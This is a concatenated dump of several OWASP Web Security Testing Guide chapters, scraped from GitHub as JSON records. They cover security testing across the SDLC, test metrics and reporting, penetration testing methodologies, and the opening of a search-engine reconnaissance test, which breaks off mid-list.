subject matter expert in software security and is also responsible for validating that the security issues in the source code have been fixed and can be checked in to the integrated system build. Typically, the manager of the application builds also makes sure that third-party libraries and executable files are security assessed for potential vulnerabilities before being integrated in the application build.\n\nThreat scenarios for common vulnerabilities that have root causes in insecure coding can also be documented in the developer’s security testing guide. When a fix is implemented for a coding defect identified with source code analysis, for example, security test cases can verify that the implementation of the code change follows the secure coding requirements documented in the secure coding standards.\n\nSource code analysis and unit tests can validate that the code change mitigates the vulnerability exposed by the previously identified coding defect. The results of automated secure code analysis can also be used as automatic check-in gates for version control, for example, software artifacts cannot be checked into the build with high or medium severity coding issues.\n\n### Functional Testers' Security Tests\n\n#### Security Testing During the Integration and Validation Phase: Integrated System Tests and Operation Tests\n\nThe main objective of integrated system tests is to validate the \"defense in depth\" concept, that is, that the implementation of security controls provides security at different layers. For example, the lack of input validation when calling a component integrated with the application is often a factor that can be tested with integration testing.\n\nThe integration system test environment is also the first environment where testers can simulate real attack scenarios as can be potentially executed by a malicious external or internal user of the application. Security testing at this level can validate whether vulnerabilities are real and can be exploited by attackers. For example, a potential vulnerability found in source code can be rated as high risk because of the exposure to potential malicious users, as well as because of the potential impact (e.g., access to confidential information).\n\nReal attack scenarios can be tested with both manual testing techniques and penetration testing tools. Security tests of this type are also referred to as ethical hacking tests. From the security testing perspective, these are risk-driven tests and have the objective of testing the application in the operational environment. The target is the application build that is representative of the version of the application being deployed into production.\n\nIncluding security testing in the integration and validation phase is critical to identifying vulnerabilities due to integration of components, as well as validating the exposure of such vulnerabilities. Application security testing requires a specialized set of skills, including both software and security knowledge, that are not typical of security engineers. As a result, organizations are often required to security-train their software developers on ethical hacking techniques, and security assessment procedures and tools. A realistic scenario is to develop such resources in-house and document them in security testing guides and procedures that take into account the developer’s security testing knowledge. A so called \"security test cases cheat sheet or checklist\", for example, can provide simple test cases and attack vectors that can be used by testers to validate exposure to common vulnerabilities such as spoofing, information disclosures, buffer overflows, format strings, SQL injection and XSS injection, XML, SOAP, canonicalization issues, denial of service, and managed code and ActiveX controls (e.g., .NET). A first battery of these tests can be performed manually with a very basic knowledge of software security.\n\nThe first objective of security tests might be the validation of a set of minimum security requirements. These security test cases might consist of manually forcing the application into error and exceptional states and gathering knowledge from the application behavior. For example, SQL injection vulnerabilities can be tested manually by injecting attack vectors through user input, and by checking if SQL exceptions are thrown back to the user. The evidence of a SQL exception error might be a manifestation of a vulnerability that can be exploited.\n\nA more in-depth security test might require the tester’s knowledge of specialized testing techniques and tools. Besides source code analysis and penetration testing, these techniques include, for example: source code and binary fault injection, fault propagation analysis and code coverage, fuzz testing, and reverse engineering. The security testing guide should provide procedures and recommend tools that can be used by security testers to perform such in-depth security assessments.\n\nThe next level of security testing after integration system tests is to perform security tests in the user acceptance environment. There are unique advantages to performing security tests in the operational environment. The user acceptance test (UAT) environment is the one that is most representative of the release configuration, with the exception of the data (e.g., test data is used in place of real data). A characteristic of security testing in UAT is testing for security configuration issues. In some cases these vulnerabilities might represent high risks. For example, the server that hosts the web application might not be configured with minimum privileges, valid HTTPS certificate and secure configuration, essential services disabled, and web root directory cleaned of test and administration web pages.\n\n## Security Test Data Analysis and Reporting\n\n### Goals for Security Test Metrics and Measurements\n\nDefining the goals for the security testing metrics and measurements is a prerequisite for using security testing data for risk analysis and management processes. For example, a measurement, such as the total number of vulnerabilities found with security tests, might quantify the security posture of the application. These measurements also help to identify security objectives for software security testing, for example, reducing the number of vulnerabilities to an acceptable minimum number before the application is deployed into production.\n\nAnother manageable goal could be to compare the application security posture against a baseline to assess improvements in application security processes. For example, the security metrics baseline might consist of an application that was tested only with penetration tests. The security data obtained from an application that was also security tested during coding should show an improvement (e.g., fewer vulnerabilities) when compared with the baseline.\n\nIn traditional software testing, the number of software defects, such as the bugs found in an application, could provide a measure of software quality. Similarly, security testing can provide a measure of software security. From the defect management and reporting perspective, software quality and security testing can use similar categorizations for root causes and defect remediation efforts. From the root cause perspective, a security defect can be due to an error in design (e.g., security flaws) or due to an error in coding (e.g., security bug). From the perspective of the effort required to fix a defect, both security and quality defects can be measured in terms of developer hours to implement the fix, the tools and resources required, and the cost to implement the fix.\n\nA characteristic of security test data, compared to quality data, is the categorization in terms of the threat, the exposure of the vulnerability, and the potential impact posed by the vulnerability to determine the risk. Testing applications for security consists of managing technical risks to make sure that the application countermeasures meet acceptable levels. For this reason, security testing data needs to support the security risk strategy at critical checkpoints during the SDLC. For example, vulnerabilities found in source code with source code analysis represent an initial measure of risk. A measure of risk (e.g., high, medium, low) for the vulnerability can be calculated by determining the exposure and likelihood factors, and by validating the vulnerability with penetration tests. The risk metrics associated to vulnerabilities found with security tests empower business management to make risk management decisions, such as to decide whether risks can be accepted, mitigated, or transferred at different levels within the organization (e.g., business as well as technical risks).\n\nWhen evaluating the security posture of an application, it is important to take into consideration certain factors, such as the size of the application being developed. Application size has been statistically proven to be related to the number of issues found in the application during testing. Since testing reduces issues, it is logical for larger size applications to be tested more often than smaller size applications.\n\nWhen security testing is done in several phases of the SDLC, the test data can prove the capability of the security tests in detecting vulnerabilities as soon as they are introduced. The test data can also prove the effectiveness of removing the vulnerabilities by implementing countermeasures at different checkpoints of the SDLC. A measurement of this type is also defined as \"containment metrics\" and provides a measure of the ability of a security assessment performed at each phase of the development process to maintain security within each phase. These containment metrics are also a critical factor in lowering the cost of fixing the vulnerabilities. It is less expensive to deal with vulnerabilities in the same phase of the SDLC that they are found, rather than fixing them later in another phase.\n\nSecurity test metrics can support security risk, cost, and defect management analysis when they are associated with tangible and timed goals such as:\n\n- Reducing the overall number of vulnerabilities by 30%.\n- Fixing security issues by a certain deadline (e.g., before beta release).\n\nSecurity test data can be absolute, such as the number of vulnerabilities detected during manual code review, as well as comparative, such as the number of vulnerabilities detected in code reviews compared to penetration tests. To answer questions about the quality of the security process, it is important to determine a baseline for what could be considered acceptable and good.\n\nSecurity test data can also support specific objectives of the security analysis. These objectives could be compliance with security regulations and information security standards, management of security processes, the identification of security root causes and process improvements, and security cost benefit analysis.\n\nWhen security test data is reported, it has to provide metrics to support the analysis. The scope of the analysis is the interpretation of test data to find clues about the security of the software being produced, as well as the effectiveness of the process.\n\nSome examples of clues supported by security test data can be:\n\n- Are vulnerabilities reduced to an acceptable level for release?\n- How does the security quality of this product compare with similar software products?\n- Are all security test requirements being met?\n- What are the major root causes of security issues?\n- How numerous are security flaws compared to security bugs?\n- Which security activity is most effective in finding vulnerabilities?\n- Which team is more productive in fixing security defects and vulnerabilities?\n- What percentage of overall vulnerabilities are high risk?\n- Which tools are most effective in detecting security vulnerabilities?\n- What kind of security tests are most effective in finding vulnerabilities (e.g., white-box vs. black-box) tests?\n- How many security issues are found during secure code reviews?\n- How many security issues are found during secure design reviews?\n\nIn order to make a sound judgment using the testing data, it is important to have a good understanding of the testing process as well as the testing tools. A tool taxonomy should be adopted to decide which security tools to use. Security tools can be qualified as being good at finding common, known vulnerabilities, when targeting different artifacts.\n\nIt is important to note that unknown security issues are not tested. The fact that a security test is clear of issues does not mean that the software or application is good.\n\nEven the most sophisticated automation tools are not a match for an experienced security tester. Just relying on successful test results from automated tools will give security practitioners a false sense of security. Typically, the more experienced the security testers are with the security testing methodology and testing tools, the better the results of the security test and analysis will be. It is important that managers making an investment in security testing tools also consider an investment in hiring skilled human resources, as well as security test training.\n\n### Reporting Requirements\n\nThe security posture of an application can be characterized from the perspective of the effect, such as number of vulnerabilities and the risk rating of the vulnerabilities, as well as from the perspective of the cause or origin, such as coding errors, architectural flaws, and configuration issues.\n\nVulnerabilities can be classified according to different criteria. The most commonly used vulnerability severity metric is the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS), a standard maintained by the Forum of Incident Response and Security Teams (FIRST).\n\nWhen reporting security test data, the best practice is to include the following information:\n\n- a categorization of each vulnerability by type;\n- the security threat that each issue is exposed to;\n- the root cause of each security issue, such as the bug or flaw;\n- each testing technique used to find the issues;\n- the remediation, or countermeasure, for each vulnerability; and\n- the severity rating of each vulnerability (e.g., high, medium, low, or CVSS score).\n\nBy describing what the security threat is, it will be possible to understand if and why the mitigation control is ineffective in mitigating the threat.\n\nReporting the root cause of the issue can help pinpoint what needs to be fixed. In the case of white-box testing, for example, the software security root cause of the vulnerability will be the offending source code.\n\nOnce issues are reported, it is also important to provide guidance to the software developer on how to re-test and find the vulnerability. This might involve using a white-box testing technique (e.g., security code review with a static code analyzer) to find if the code is vulnerable. If a vulnerability can be found via a black-box penetration test, the test report also needs to provide information on how to validate the exposure of the vulnerability to the frontend (e.g., client).\n\nThe information about how to fix the vulnerability should be detailed enough for a developer to implement a fix. It should provide secure coding examples, configuration changes, and provide adequate references.\n\nFinally, the severity rating contributes to the calculation of risk rating and helps to prioritize the remediation effort. Typically, assigning a risk rating to the vulnerability involves external risk analysis based upon factors such as impact and exposure.\n\n### Business Cases\n\nFor the security test metrics to be useful, they need to provide value back to the organization's security test data stakeholders. The stakeholders can include project managers, developers, information security offices, auditors, and chief information officers. The value can be in terms of the business case that each project stakeholder has, in terms of role and responsibility.\n\nSoftware developers look at security test data to show that software is coded securely and efficiently. This allows them to make the case for using source code analysis tools, following secure coding standards, and attending software security training.\n\nProject managers look for data that allows them to successfully manage and utilize security testing activities and resources according to the project plan. To project managers, security test data can show that projects are on schedule and moving on target for delivery dates, and are getting better during tests.\n\nSecurity test data also helps the business case for security testing if the initiative comes from information security officers (ISOs). For example, it can provide evidence that security testing during the SDLC does not impact the project delivery, but rather reduces the overall workload needed to address vulnerabilities later in production.\n\nTo compliance auditors, security test metrics provide a level of software security assurance and confidence that security standard compliance is addressed through the security review processes within the organization.\n\nFinally, Chief Information Officers (CIOs), and Chief Information Security Officers (CISOs), who are responsible for the budget that needs to be allocated in security resources, look for derivation of a cost-benefit analysis from security test data. This allows them to make informed decisions about which security activities and tools to invest in. One of the metrics that supports such analysis is the Return On Investment (ROI) in security. To derive such metrics from security test data, it is important to quantify the differential between the risk, due to the exposure of vulnerabilities, and the effectiveness of the security tests in mitigating the security risk, then factor this gap with the cost of the security testing activity or the testing tools adopted.\n\n## References\n\n- US National Institute of Standards (NIST) 2002 [survey on the cost of insecure software to the US economy due to inadequate software testing](https://www.nist.gov/director/planning/upload/report02-3.pdf)\n", "timestamp": "2025-10-24T11:39:40.127421"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md", "url": "https://github.com/OWASP/wstg/blob/master/document/3-The_OWASP_Testing_Framework/0-The_Web_Security_Testing_Framework.md", "content": "# The Web Security Testing Framework\n\n## Overview\n\nThis section describes a typical testing framework that can be developed within an organization. It can be seen as a reference framework comprised of techniques and tasks that are appropriate at various phases of the software development life cycle (SDLC). Companies and project teams can use this model to develop their own testing framework, and to scope testing services from vendors. This framework should not be seen as prescriptive, but as a flexible approach that can be extended and molded to fit an organization's development process and culture.\n\nThis section aims to help organizations build a complete strategic testing process, and is not aimed at consultants or contractors who tend to be engaged in more tactical, specific areas of testing.\n\nIt is critical to understand why building an end-to-end testing framework is crucial to assessing and improving software security. In *Writing Secure Code*, Howard and LeBlanc note that issuing a security bulletin costs Microsoft at least $100,000, and it costs their customers collectively far more than that to implement the security patches. They also note that the US government's [CyberCrime web site](https://www.justice.gov/criminal-ccips) details recent criminal cases and the loss to organizations. Typical losses far exceed USD $100,000.\n\nWith economics like this, it is little wonder why software vendors move from solely performing black-box security testing, which can only be performed on applications that have already been developed, to concentrating on testing in the early cycles of application development, such as during definition, design, and development.\n\nMany security practitioners still see security testing in the realm of penetration testing. As discussed in the previous chapter, while penetration testing has a role to play, it is generally inefficient at finding bugs and relies excessively on the skill of the tester. It should only be considered as an implementation technique, or to raise awareness of production issues. To improve the security of applications, the security quality of the software must be improved. That means testing security during the definition, design, development, deployment, and maintenance stages, and not relying on the costly strategy of waiting until code is completely built.\n\nAs discussed in the introduction of this document, there are many development methodologies, such as the Rational Unified Process, eXtreme and Agile development, and traditional waterfall methodologies. The intent of this guide is to suggest neither a particular development methodology, nor provide specific guidance that adheres to any particular methodology. Instead, we are presenting a generic development model, and the reader should follow it according to their company process.\n\nThis testing framework consists of activities that should take place:\n\n- Before development begins,\n- During definition and design,\n- During development,\n- During deployment, and\n- During maintenance and operations.\n\n## Phase 1 Before Development Begins\n\n### Phase 1.1 Define a SDLC\n\nBefore application development starts, an adequate SDLC must be defined where security is inherent at each stage.\n\n### Phase 1.2 Review Policies and Standards\n\nEnsure that there are appropriate policies, standards, and documentation in place. Documentation is extremely important as it gives development teams guidelines and policies that they can follow. People can only do the right thing if they know what the right thing is.\n\nIf the application is to be developed in Java, it is essential that there is a Java secure coding standard. If the application is to use cryptography, it is essential that there is a cryptography standard. No policies or standards can cover every situation that the development team will face. By documenting the common and predictable issues, there will be fewer decisions that need to be made during the development process.\n\n### Phase 1.3 Develop Measurement and Metrics Criteria and Ensure Traceability\n\nBefore development begins, plan the measurement program. By defining criteria that need to be measured, it provides visibility into defects in both the process and product. It is essential to define the metrics before development begins, as there may be a need to modify the process in order to capture the data.\n\n## Phase 2 During Definition and Design\n\n### Phase 2.1 Review Security Requirements\n\nSecurity requirements define how an application works from a security perspective. It is essential that the security requirements are tested. Testing in this case means testing the assumptions that are made in the requirements and testing to see if there are gaps in the requirements definitions.\n\nFor example, if there is a security requirement that states that users must be registered before they can get access to the whitepapers section of a website, does this mean that the user must be registered with the system or should the user be authenticated? Ensure that requirements are as unambiguous as possible.\n\nWhen looking for requirements gaps, consider looking at security mechanisms such as:\n\n- User management\n- Authentication\n- Authorization\n- Data confidentiality\n- Integrity\n- Accountability\n- Session management\n- Transport security\n- Tiered system segregation\n- Legislative and standards compliance (including privacy, government, and industry standards)\n\n### Phase 2.2 Review Design and Architecture\n\nApplications should have a documented design and architecture. This documentation can include models, textual documents, and other similar artifacts. It is essential to test these artifacts to ensure that the design and architecture enforce the appropriate level of security as defined in the requirements.\n\nIdentifying security flaws in the design phase is not only one of the most cost-efficient places to identify flaws, but can be one of the most effective places to make changes. For example, if it is identified that the design calls for authorization decisions to be made in multiple places, it may be appropriate to consider a central authorization component. If the application is performing data validation at multiple places, it may be appropriate to develop a central validation framework (i.e. fixing input validation in one place, rather than in hundreds of places, is far cheaper).\n\nIf weaknesses are discovered, they should be given to the system architect for alternative approaches.\n\n### Phase 2.3 Create and Review UML Models\n\nOnce the design and architecture is complete, build Unified Modeling Language (UML) models that describe how the application works. In some cases, these may already be available. Use these models to confirm with the systems designers an exact understanding of how the application works. If weaknesses are discovered, they should be given to the system architect for alternative approaches.\n\n### Phase 2.4 Create and Review Threat Models\n\nArmed with design and architecture reviews and the UML models explaining exactly how the system works, undertake a threat modeling exercise. Develop realistic threat scenarios. Analyze the design and architecture to ensure that these threats have been mitigated, accepted by the business, or assigned to a third party, such as an insurance firm. When identified threats have no mitigation strategies, revisit the design and architecture with the systems architect to modify the design.\n\n## Phase 3 During Development\n\nTheoretically, development is the implementation of a design. However, in the real world, many design decisions are made during code development. These are often smaller decisions that were either too detailed to be described in the design, or issues where no policy or standard guidance was offered. If the design and architecture were not adequate, the developer will be faced with many decisions. If there were insufficient policies and standards, the developer will be faced with even more decisions.\n\n### Phase 3.1 Code Walkthrough\n\nThe security team should perform a code walkthrough with the developers, and in some cases, the system architects. A code walkthrough is a high-level look at the code during which the developers can explain the logic and flow of the implemented code. It allows the code review team to obtain a general understanding of the code, and allows the developers to explain why certain things were developed the way they were.\n\nThe purpose is not to perform a code review, but to understand at a high level the flow, the layout, and the structure of the code that makes up the application.\n\n### Phase 3.2 Code Reviews\n\nArmed with a good understanding of how the code is structured and why certain things were coded the way they were, the tester can now examine the actual code for security defects.\n\nStatic code reviews validate the code against a set of checklists, including:\n\n- Business requirements for availability, confidentiality, and integrity;\n- OWASP Guide or Top 10 Checklists for technical exposures (depending on the depth of the review);\n- Specific issues relating to the language or framework in use, such as the Scarlet paper for PHP or [Microsoft Secure Coding checklists for ASP.NET](https://msdn.microsoft.com/en-us/library/ff648269.aspx); and\n- Any industry-specific requirements, such as Sarbanes-Oxley 404, COPPA, ISO/IEC 27002, APRA, HIPAA, Visa Merchant guidelines, or other regulatory regimes.\n\nIn terms of return on resources invested (mostly time), static code reviews produce far higher quality returns than any other security review method and rely least on the skill of the reviewer. However, they are not a silver bullet and need to be considered carefully within a full-spectrum testing regime.\n\nFor more details on OWASP checklists, please refer to the latest edition of the [OWASP Top 10](https://owasp.org/www-project-top-ten/).\n\n## Phase 4 During Deployment\n\n### Phase 4.1 Application Penetration Testing\n\nHaving tested the requirements, analyzed the design, and performed code review, it might be assumed that all issues have been caught. Hopefully this is the case, but penetration testing the application after it has been deployed provides an additional check to ensure that nothing has been missed.\n\n### Phase 4.2 Configuration Management Testing\n\nThe application penetration test should include an examination of how the infrastructure was deployed and secured. It is important to review configuration aspects, no matter how small, to ensure that none are left at a default setting that may be vulnerable to exploitation.\n\n## Phase 5 During Maintenance and Operations\n\n### Phase 5.1 Conduct Operational Management Reviews\n\nThere needs to be a process in place which details how the operational side of both the application and infrastructure is managed.\n\n### Phase 5.2 Conduct Periodic Health Checks\n\nMonthly or quarterly health checks should be performed on both the application and infrastructure to ensure no new security risks have been introduced and that the level of security is still intact.\n\n### Phase 5.3 Ensure Change Verification\n\nAfter every change has been approved and tested in the QA environment and deployed into the production environment, it is vital that the change is checked to ensure that the level of security has not been affected by the change. This should be integrated into the change management process.\n\n## A Typical SDLC Testing Workflow\n\nThe following figure shows a typical SDLC Testing Workflow.\n\n![Typical SDLC Testing Workflow](images/Typical_SDLC_Testing_Workflow.gif)\\\n *Figure 3-1: Typical SDLC testing workflow*\n", "timestamp": "2025-10-24T11:39:40.708196"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies.md", "url": "https://github.com/OWASP/wstg/blob/master/document/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies.md", "content": "# Penetration Testing Methodologies\n\n## Summary\n\n- [OWASP Testing Guides](#owasp-testing-guides)\n    - Web Security Testing Guide (WSTG)\n    - Mobile Security Testing Guide (MSTG)\n    - Firmware Security Testing Methodology\n- [Penetration Testing Execution Standard](#penetration-testing-execution-standard)\n- [PCI Penetration Testing Guide](#pci-penetration-testing-guide)\n    - [PCI DSS Penetration Testing Guidance](#pci-dss-penetration-testing-guidance)\n    - [PCI DSS Penetration Testing Requirements](#pci-dss-penetration-testing-requirements)\n- [Penetration Testing Framework](#penetration-testing-framework)\n- [Technical Guide to Information Security Testing and Assessment](#technical-guide-to-information-security-testing-and-assessment)\n- [Open Source Security Testing Methodology Manual](#open-source-security-testing-methodology-manual)\n- [References](#references)\n\n## OWASP Testing Guides\n\nIn terms of technical security testing execution, the OWASP testing guides are highly recommended. Depending on the types of the applications, the testing guides are listed below for the web/cloud services, Mobile app (Android/iOS), or IoT firmware respectively.\n\n- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)\n- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)\n- [OWASP Firmware Security Testing Methodology](https://github.com/scriptingxss/owasp-fstm)\n\n## Penetration Testing Execution Standard\n\nPenetration Testing Execution Standard (PTES) defines penetration testing as 7 phases. Particularly, PTES Technical Guidelines give hands-on suggestions on testing procedures, and recommendation for security testing tools.\n\n- Pre-engagement Interactions\n- Intelligence Gathering\n- Threat Modeling\n- Vulnerability Analysis\n- Exploitation\n- Post Exploitation\n- Reporting\n\n[PTES Technical Guidelines](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)\n\n## PCI Penetration Testing Guide\n\nPayment Card Industry Data Security Standard (PCI DSS) Requirement 11.3 defines the penetration testing. PCI also defines Penetration Testing Guidance.\n\n### PCI DSS Penetration Testing Guidance\n\nThe PCI DSS Penetration testing guideline provides guidance on the following:\n\n- Penetration Testing Components\n- Qualifications of a Penetration Tester\n- Penetration Testing Methodologies\n- Penetration Testing Reporting Guidelines\n\n### PCI DSS Penetration Testing Requirements\n\nThe PCI DSS requirement refer to Payment Card Industry Data Security Standard (PCI DSS) Requirement 11.3\n\n- Based on industry-accepted approaches\n- Coverage for CDE and critical systems\n- Includes external and internal testing\n- Test to validate scope reduction\n- Application-layer testing\n- Network-layer tests for network and OS\n\n[PCI DSS Penetration Test Guidance](https://www.pcisecuritystandards.org/documents/Penetration-Testing-Guidance-v1_1.pdf)\n\n## Penetration Testing Framework\n\nThe Penetration Testing Framework (PTF) provides comprehensive hands-on penetration testing guide. It also lists usages of the security testing tools in each testing category. The major area of penetration testing includes:\n\n- Network Footprinting (Reconnaissance)\n- Discovery & Probing\n- Enumeration\n- Password cracking\n- Vulnerability Assessment\n- AS/400 Auditing\n- Bluetooth Specific Testing\n- Cisco Specific Testing\n- Citrix Specific Testing\n- Network Backbone\n- Server Specific Tests\n- VoIP Security\n- Wireless Penetration\n- Physical Security\n- Final Report - template\n\n[Penetration Testing Framework](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)\n\n## Technical Guide to Information Security Testing and Assessment\n\nTechnical Guide to Information Security Testing and Assessment (NIST 800-115) was published by NIST, it includes some assessment techniques listed below.\n\n- Review Techniques\n- Target Identification and Analysis Techniques\n- Target Vulnerability Validation Techniques\n- Security Assessment Planning\n- Security Assessment Execution\n- Post-Testing Activities\n\nThe NIST 800-115 can be accessed [here](https://csrc.nist.gov/publications/detail/sp/800-115/final)\n\n## Open Source Security Testing Methodology Manual\n\nThe Open Source Security Testing Methodology Manual (OSSTMM) is a methodology to test the operational security of physical locations, workflow, human security testing, physical security testing, wireless security testing, telecommunication security testing, data networks security testing and compliance. OSSTMM can be supporting reference of ISO 27001 instead of a hands-on or technical application penetration testing guide.\n\nOSSTMM includes the following key sections:\n\n- Security Analysis\n- Operational Security Metrics\n- Trust Analysis\n- Work Flow\n- Human Security Testing\n- Physical Security Testing\n- Wireless Security Testing\n- Telecommunications Security Testing\n- Data Networks Security Testing\n- Compliance Regulations\n- Reporting with the STAR (Security Test Audit Report)\n\n[Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf)\n\n## References\n\n- [PCI Data Security Standard - Penetration TestingGuidance](https://www.pcisecuritystandards.org/documents/Penetration-Testing-Guidance-v1_1.pdf)\n- [PTES Standard](http://www.pentest-standard.org/index.php/Main_Page)\n- [Open Source Security Testing Methodology Manual (OSSTMM)](https://www.isecom.org/research.html#content5-9d)\n- [Technical Guide to Information Security Testing and Assessment NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)\n- [HIPAA Security Testing Guidance](https://www.hhs.gov/hipaa/for-professionals/security/guidance/cybersecurity/index.html)\n- [Penetration Testing Framework 0.59](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)\n- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)\n- [Kali Linux](https://www.kali.org/)\n- [Information Supplement: Requirement 11.3 Penetration Testing](https://www.pcisecuritystandards.org/pdfs/infosupp_11_3_penetration_testing.pdf)\n", "timestamp": "2025-10-24T11:39:40.810834"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/3-The_OWASP_Testing_Framework/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/3-The_OWASP_Testing_Framework/README.md", "content": "# The OWASP Testing Framework\n\n3.1 [The Web Security Testing Framework](0-The_Web_Security_Testing_Framework.md)\n\n3.2 [Phase 1 Before Development Begins](0-The_Web_Security_Testing_Framework.md#phase-1-before-development-begins)\n\n3.3 [Phase 2 During Definition and Design](0-The_Web_Security_Testing_Framework.md#phase-2-during-definition-and-design)\n\n3.4 [Phase 3 During Development](0-The_Web_Security_Testing_Framework.md#phase-3-during-development)\n\n3.5 [Phase 4 During Deployment](0-The_Web_Security_Testing_Framework.md#phase-4-during-deployment)\n\n3.6 [Phase 5 During Maintenance and Operations](0-The_Web_Security_Testing_Framework.md#phase-5-during-maintenance-and-operations)\n\n3.7 [A Typical SDLC Testing Workflow](0-The_Web_Security_Testing_Framework.md#a-typical-sdlc-testing-workflow)\n\n3.8 [Penetration Testing Methodologies](1-Penetration_Testing_Methodologies.md)\n", "timestamp": "2025-10-24T11:39:40.915691"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/00-Introduction_and_Objectives/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/00-Introduction_and_Objectives/README.md", "content": "# 4.0 Introduction and Objectives\n\nThis section describes the OWASP web application security testing methodology and explains how to test for evidence of vulnerabilities within the application due to deficiencies with identified security controls.\n\n## What is Web Application Security Testing?\n\nA security test is a method of evaluating the security of a computer system or network by methodically validating and verifying the effectiveness of application security controls. A web application security test focuses only on evaluating the security of a web application. The process involves an active analysis of the application for any weaknesses, technical flaws, or vulnerabilities. Any security issues that are found will be presented to the system owner, together with an assessment of the impact, a proposal for mitigation or a technical solution.\n\n## What is a Vulnerability?\n\nA vulnerability is a flaw or weakness in a system's design, implementation, operation or management that could be exploited to compromise the system's security objectives.\n\n## What is a Threat?\n\nA threat is anything (a malicious external attacker, an internal user, a system instability, etc) that may harm the assets owned by an application (resources of value, such as the data in a database or in the file system) by exploiting a vulnerability.\n\n## What is a Test?\n\nA test is an action to demonstrate that an application meets the security requirements of its stakeholders.\n\n## The Approach in Writing this Guide\n\nThe OWASP approach is open and collaborative:\n\n- Open: every security expert can participate with their experience in the project. Everything is free.\n- Collaborative: brainstorming is performed before the articles are written so the team can share ideas and develop a collective vision of the project. That means rough consensus, a wider audience and increased participation.\n\nThis approach tends to result in a defined Testing Methodology that will be:\n\n- Consistent\n- Reproducible\n- Rigorous\n- Under quality control\n\nThe problems to be addressed are fully documented and tested. It is important to use various methods to test all the known vulnerabilities and document all the security test activities.\n\n## What Is the OWASP Testing Methodology?\n\nSecurity testing will never be an exact science where a complete list of all possible issues that should be tested can be defined. In fact, security testing is only one of the several suitable techniques for testing the security of web applications under certain circumstances. The goal of this project is to collect all the possible testing techniques, explain these techniques, and keep the guide updated. The OWASP Web Application Security Testing methodology is based on the black box approach. The tester has little to no information about the application to be tested.\n\nThe testing model consists of:\n\n- Tester: Who performs the testing activities\n- Tools and methodology: The core of this Testing Guide project\n- Application: The black box to test\n\nTesting can be categorized as passive or active:\n\n### Passive Testing\n\nDuring passive testing, a tester tries to understand the application's logic and explores the application as an end user. Tools can be used for information gathering. For example, an HTTP(S) proxy can be used to observe all the HTTP(S) requests and responses. At the end of this phase, the tester should generally understand all the access points and functionality of the system (e.g., HTTP headers, parameters, cookies, APIs, technology usage/patterns, etc). The [Information Gathering](../01-Information_Gathering/README.md) section explains how to perform passive testing.\n\nFor example, a tester may find a page at the following URL: `https://www.example.com/login/auth_form`\n\nThis may indicate an authentication form where the application requests a username and password.\n\nThe following parameters represent two access points to the application: `https://www.example.com/appx?a=1&b=1`\n\nIn this case, the application has two access points (parameters `a` and `b`). All the input points found in this phase represent targets for testing. Keeping track of the directory or call tree of the application and all the access points can be useful during active testing.\n\n### Active Testing\n\nDuring active testing, a tester uses the methodologies described in the following sections.\n\nThe set of active tests have been split into 12 categories:\n\n- Information Gathering\n- Configuration and Deployment Management Testing\n- Identity Management Testing\n- Authentication Testing\n- Authorization Testing\n- Session Management Testing\n- Input Validation Testing\n- Testing for Error Handling\n- Testing for Weak Cryptography\n- Business Logic Testing\n- Client-side Testing\n- API Testing\n", "timestamp": "2025-10-24T11:39:41.774481"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md", "content": "# Conduct Search Engine Discovery Reconnaissance for Information Leakage\n\n|ID          |\n|------------|\n|WSTG-INFO-01|\n\n## Summary\n\nIn order for search engines to work, computer programs (or `robots`) regularly fetch data (referred to as [crawling](https://en.wikipedia.org/wiki/Web_crawler)) from billions of pages on the web. These programs find web content and functionality by following links from other pages, or by looking at sitemaps. If a site uses a special file called `robots.txt` to list pages that it does not want search engines to fetch, then the pages listed there will be ignored. This is a basic overview - Google offers a more in-depth explanation of [how a search engine works](https://support.google.com/webmasters/answer/70897?hl=en).\n\nTesters can use search engines to perform reconnaissance on sites and web applications. There are direct and indirect elements to search engine discovery and reconnaissance: direct methods relate to searching the indexes and the associated content from caches, while indirect methods relate to learning sensitive design and configuration information by searching forums, newsgroups, and tendering sites.\n\nOnce a search engine robot has completed crawling, it commences indexing the web content based on tags and associated attributes, such as `<TITLE>`, in order to return relevant search results. If the `robots.txt` file is not updated during the lifetime of the site, and in-line HTML meta tags that instruct robots not to index content have not been used, then it is possible for indexes to contain web content not intended to be included by the owners. Site owners may use the previously mentioned `robots.txt`, HTML meta tags, authentication, and tools provided by search engines to remove such content.\n\n## Test Objectives\n\n- Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's site) or indirectly (via third-party services).\n\n## How to Test\n\nUse a search engine to search for potentially sensitive information. This may include:\n\n- network diagrams and configurations;\n- archived posts and emails by administrators or other key staff;\n- logon procedures and username formats;\n- usernames, passwords, and private keys;\n- third-party, or cloud service configuration files;\n- revealing error message content; and\n- non-public applications (development, test, User Acceptance Testing (UAT), and staging versions of sites).\n\n### Search Engines\n\nDo not limit testing to just one search engine provider, as different search engines may generate different results. Search engine results can vary in a few ways, depending on when the engine last crawled content, and the algorithm the engine uses to determine relevant pages. Consider using the following (alphabetically listed) search engines:\n\n- [Baidu](https://www.baidu.com/), China's [most popular](https://en.wikipedia.org/wiki/Web_search_engine#Market_share) search engine.\n- 